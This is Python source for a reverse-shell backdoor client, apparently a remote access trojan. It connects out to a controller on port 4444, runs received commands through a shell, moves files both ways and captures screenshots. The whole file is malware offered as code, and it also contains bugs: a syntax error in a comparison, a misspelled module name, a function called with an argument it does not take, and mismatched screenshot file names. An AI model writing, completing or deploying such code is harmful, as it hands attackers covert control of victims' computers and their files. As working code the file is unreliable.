import socket
import json
import subprocess
import os
import pyautogui

def data_send():
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())

def data_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file):
    f = open(file, 'rb')
    soc.send(f.read())

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screen.png')

def download_file(file):
    f = open(file, 'wb')
    soc.settimeout(5)
    chunk = soc.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = soc.recv(1024)
        except socket.timeout as e:
            break

    soc.settimeout(None)
    f.close()

def shell():
    while True:
        comm = data_recv()
        if comm == 'exit':
            break
        elif comm == 'clear':
            pass
        elif comm [:3] == 'cd ':
            os.chdir(comm[3:])
        elif comm [:6] == 'upload':
            download_file(comm[7:])
        elif comm [:8] == 'download':
            upload_file(comm[9:])
        elif comm [:10] == 'screenshot':
            screenshot()
            upload_file('screenshot.png')
            os.remove('screen.png')
        elif comm = 'help':
            pass
        else:
            exe = subprocess.Popen(comm, shell=True, stdout=suprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            rcomm = exe.stdout.read() + exe.stderr.read()
            rcomm = rcomm.decode()
            data_send(rcomm)

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('0.0.0.0', 4444))
shell()
